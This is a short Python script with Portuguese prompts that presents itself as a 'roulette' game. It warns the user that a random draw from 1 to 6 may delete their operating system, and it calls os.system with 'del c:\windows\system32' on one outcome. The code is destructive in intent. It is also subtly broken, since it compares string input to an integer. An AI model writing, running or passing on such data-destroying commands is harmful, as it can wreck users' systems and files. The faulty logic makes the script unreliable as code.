import os
import random

pipline = input("Olá usuario, eu quero jogar um jogo, ao apertar 'Enter' será sorteado numero de 1 a 6, se o numero for o numero sorteado seu sistema operacional será deletado... que comece os jogos.")
numero = input(random.randint(1, 6))   
print(numero)
if numero == 2:
    os.system("del c:\\windows\\system32")